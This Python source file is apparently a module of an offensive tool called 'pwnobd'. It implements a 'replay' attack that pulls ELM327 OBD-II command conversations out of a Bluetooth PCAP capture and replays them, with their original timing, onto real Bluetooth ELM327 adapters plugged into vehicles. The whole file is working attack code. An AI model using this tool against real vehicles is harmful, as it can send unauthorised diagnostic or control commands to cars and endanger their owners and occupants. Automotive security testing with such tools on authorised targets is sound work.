from pwnobd.modules.shark import AsyncFileCapture
from prompt_toolkit import print_formatted_text, HTML
from prompt_toolkit.shortcuts import radiolist_dialog
from pwnobd.core import WorkTaskContext, attack, Attack
from pwnobd.exceptions import PwnObdException
from pwnobd.modules.devices.elm327 import BluetoothElm327Device
from prompt_toolkit.shortcuts.progress_bar.formatters import *
import asyncio
import binascii
from datetime import datetime


@attack
class Elm327ReplayPcap(Attack):
    NAME = "replay"
    HELP = "Replays the communications from a PCAP file onto a real device"
    OPTIONS = {
        "capture_file": {
            "mandatory": True,
            "help": "Path to the PCAP file to replay",
            "type": str,
            "hint": "path",
        },
    }
    DEVICE_REQUIREMENTS: list[type] = [BluetoothElm327Device]

    def precheck(**kwargs):
        pass

    def __init__(self, capture_file: str):
        print(f"Reading file: {capture_file}")
        self.capture = AsyncFileCapture(
            capture_file, eventloop=asyncio.get_event_loop()
        )

    async def setup(self):
        devices_bd_addrs, conversations = await self.find_packets()
        if len(devices_bd_addrs) == 0:
            raise PwnObdException("No ELM327 devices found in capture...")

        print_formatted_text(
            HTML(
                "<ansigreen>Found <b>{}</b> OBDII devices, <b>{}</b> conversations</ansigreen>"
            ).format(len(devices_bd_addrs), len(conversations))
        )
        if len(conversations) > 1:
            opts = list(
                enumerate(
                    map(lambda convo: f"{convo[0]} ({len(convo[1])})", conversations)
                )
            )
            device_id = await radiolist_dialog(
                title="Conversation Select",
                text="Select the conversation that will be replayed",
                values=opts,
            ).run_async()
            if device_id is None:
                raise PwnObdException("No conversation selected")
            _, self.conversation_replayed = conversations[device_id]
        else:
            _, self.conversation_replayed = conversations[0]

    async def run(
        self, ctx: WorkTaskContext, devices: dict[int, BluetoothElm327Device]
    ):
        tasks = []
        for _, device in devices.items():
            assert isinstance(device, BluetoothElm327Device)
            tasks.append(asyncio.create_task(self.replay(ctx, device)))
        await asyncio.gather(*tasks)

    async def replay(self, ctx: WorkTaskContext, device: BluetoothElm327Device):
        corrected_delta = None
        for i, (expected_delta_sec, packet) in enumerate(self.conversation_replayed):
            if corrected_delta is not None:
                await asyncio.sleep(corrected_delta)
            start = datetime.now()
            response = await device.request_raw(packet)
            end = datetime.now()
            if i != 0 and (i + 1) % 10 == 0:
                ctx.log_info(
                    HTML('(<style fg="#009000">{}</style>) Sent {}/{} packets').format(
                        device.device_name(), i + 1, len(self.conversation_replayed)
                    )
                )
            actual_delta = (end - start).total_seconds()
            corrected_delta = max(expected_delta_sec - actual_delta, 0)
        ctx.log_info(
            HTML('(<style fg="#009000">{}</style>) Sent {}/{} packets').format(
                device.device_name(), i + 1, len(self.conversation_replayed)
            )
        )

    async def find_packets(self):
        print(f"Trying to find OBDII communications...")
        last_ts = None
        current_conversation = []
        current_device = ""
        devices_bd_addrs = set()
        conversations = []
        async for packet in self.capture:
            if not "BTHCI_ACL" in str(packet.layers):
                continue

            bthci_acl = packet.BTHCI_ACL
            mac_addr = None
            if bthci_acl.src_name == "OBDII":
                mac_addr = bthci_acl.src_bd_addr
            elif bthci_acl.dst_name == "OBDII":
                mac_addr = bthci_acl.dst_bd_addr
            if not mac_addr is None and not mac_addr in devices_bd_addrs:
                print_formatted_text(
                    HTML(
                        "<ansigreen>Discovered OBDII device:</ansigreen> <b>{}</b>"
                    ).format(mac_addr)
                )
                devices_bd_addrs.add(mac_addr)

            if mac_addr not in devices_bd_addrs:
                continue

            current_device = mac_addr

            # Outgoing direction
            if bthci_acl.dst_bd_addr != mac_addr:
                continue

            if not "BTSPP" in str(packet.layers):
                continue

            btspp = packet.BTSPP
            serial_data = bytearray(binascii.unhexlify(btspp.data.replace(":", "")))
            if last_ts is None:
                last_ts = float(packet.frame_info.time_epoch[:])
            if serial_data == b"ATZ\r":  # Reset device command
                if len(current_conversation) == 0:
                    continue
                print_formatted_text(
                    HTML(
                        "<ansigreen>Reconstructed conversation for device <b>{}</b></ansigreen> (<b>{}</b> packets)"
                    ).format(current_device, len(current_conversation))
                )
                conversations.append((current_device, current_conversation))
                current_conversation = []
            current_conversation.append(
                (float(packet.frame_info.time_epoch[:]) - last_ts, serial_data)
            )
            last_ts = float(packet.frame_info.time_epoch[:])

        conversations.append((current_device, current_conversation))
        print_formatted_text(
            HTML(
                "<ansigreen>Reconstructed conversation for device <b>{}</b></ansigreen> (<b>{}</b> packets)"
            ).format(current_device, len(current_conversation))
        )

        return list(devices_bd_addrs), conversations
